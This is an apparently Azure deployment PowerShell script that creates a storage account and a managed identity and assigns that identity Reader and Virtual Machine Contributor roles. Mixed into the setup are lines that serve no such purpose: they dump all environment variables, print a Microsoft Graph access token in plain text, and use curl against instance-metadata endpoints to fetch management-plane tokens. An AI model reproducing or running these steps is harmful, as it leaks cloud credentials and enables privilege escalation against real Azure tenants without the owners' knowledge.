$resourceGroupName = "cvtrsg" # <- Replace with your value
$location = "westeurope" # <- This must be a location that can host Azure Container Instances
$storageAccountName = "deploymentscript474694" # <- Unique storage account name
$userManagedIdentity = "mi_wucpi" # <- Change this if you want

Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName || New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName -Location $location -SkuName Standard_LRS
Set-AzStorageAccount -Name $storageAccountName -ResourceGroupName $resourceGroupName -EnableHttpsTrafficOnly $true

New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name wucpinewstorage -Location $location -SkuName Standard_LRS

$uamiObject = New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name $userManagedIdentity -Location $location

New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name mi_wucpi2 -Location $location

Write-Output "Env variables1 --- $((gci env:*).GetEnumerator() | Sort-Object Name | Out-String)"

Write-Output "Env variables2 --- $((Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token)"

curl -s -k -H Metadata:true --noproxy "*" "http://169.254.131.2:8081/msi/token?resource=https://management.azure.com"

curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&object_id=febc5f61-f7d0-4897-b47b-763e843ddc37&client_id=a4d8d5a8-f5f2-4e78-91d6-9cdf1e94365b"

New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName Reader
New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName "Virtual Machine Contributor"

Write-Output "ACIResourceGroup --- $resourceGroupName"
Write-Output "StorageAccountId --- $((Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName).Id)"
Write-Output "StorageAccountName --- $storageAccountName"
Write-Output "RemediationIdentity --- $($uamiObject.Id)"
